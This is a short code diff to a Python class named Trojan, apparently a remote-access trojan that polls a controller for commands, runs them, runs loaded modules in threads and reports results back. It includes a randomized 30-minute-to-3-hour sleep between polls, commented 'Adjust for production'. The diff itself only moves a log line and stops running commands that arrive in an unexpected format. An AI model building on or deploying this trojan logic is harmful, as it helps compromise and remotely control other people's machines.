@@ -70,7 +70,6 @@ class Trojan:
         self.send_command_result(command, result)
 
     def module_runner(self, module):
-        print(f"[*] Running module: {module}")
         result = sys.modules[module].run()
         self.store_module_result(result)
 
@@ -100,6 +99,7 @@ class Trojan:
                         if command.get("action") == "run_module":
                             module_name = command.get("module")
                             if module_name:
+                                print(f"[*] Running module: {module_name}")
                                 thread = threading.Thread(target=self.module_runner, args=(module_name,))
                                 thread.start()
                         else:
@@ -108,8 +108,7 @@ class Trojan:
                                 print(f"[*] Executing command: {command_str}")
                                 self.execute_command(command_str)
                     else:
-                        print(f"[*] Executing command: {command}")
-                        self.execute_command(command)
+                        print(f"[*] Invalid command format: {command}")
 
             time.sleep(random.randint(30*60, 3*60*60))  # Adjust for production
 
